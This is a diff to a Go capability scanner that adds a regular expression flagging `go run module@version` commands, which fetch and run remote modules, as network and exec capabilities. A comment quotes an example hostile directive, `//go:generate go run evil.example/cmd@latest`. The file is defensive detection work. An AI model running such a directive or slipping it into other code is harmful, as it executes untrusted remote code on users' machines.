@@ -411,6 +411,17 @@ var (
 		`|pip[0-9.]*\s+install\b|python[0-9.]*\s+-m\s+pip\s+install\b` +
 		`|gem\s+install\b|cargo\s+install\b|go\s+install\b|poetry\s+add\b|uv\s+(?:pip\s+install|add)\b` +
 		`)`)
+
+	// goRunRemoteRe recognizes `go run <module>@<version>` — Go's package RUNNER,
+	// the npx analog (OPU-28 Increment 4). Since Go 1.17 a `go run` argument with a
+	// `@version` suffix FETCHES and RUNS that remote module in one step (network +
+	// exec); it most often rides a `//go:generate go run evil.example/cmd@latest`
+	// directive. The `@version` is the discriminator and the run-vs-fetch line: Go
+	// requires it to fetch, so `go run ./local`, `go run .`, and `go run main.go`
+	// (local code, no fetch) carry no version and do not match — the same discipline
+	// that keeps `pnpm exec` off the runner set. The prefix class carries `'"` so a
+	// shell-string invocation is caught too.
+	goRunRemoteRe = regexp.MustCompile(`(?i)(?:^|[\s;&|(='"` + "`" + `])go[ \t]+run[ \t]+(?:-\S+[ \t]+)*[\w][\w./-]*@[\w][\w.+~-]*`)
 )
 
 // isBenignRunnerTarget reports whether a package RUNNER's target (the package it
@@ -547,6 +558,12 @@ func scanCaps(text string) ([]Capability, []string) {
 	// (OPU-27). Network only; exec, if present, is scored by the exec markers.
 	if m := pkgInstallRe.FindString(text); m != "" {
 		add(CapNetwork, "pkg-install:"+strings.TrimSpace(m))
+	}
+	// Go package RUNNER: `go run <module>@<version>` fetches AND runs a remote
+	// module in one step — network + exec, the npx analog (OPU-28 Increment 4).
+	if m := goRunRemoteRe.FindString(text); m != "" {
+		add(CapNetwork, "pkg-runner:"+strings.TrimSpace(m))
+		add(CapExec, "pkg-runner:"+strings.TrimSpace(m))
 	}
 	return caps, dedupe(ev)
 }
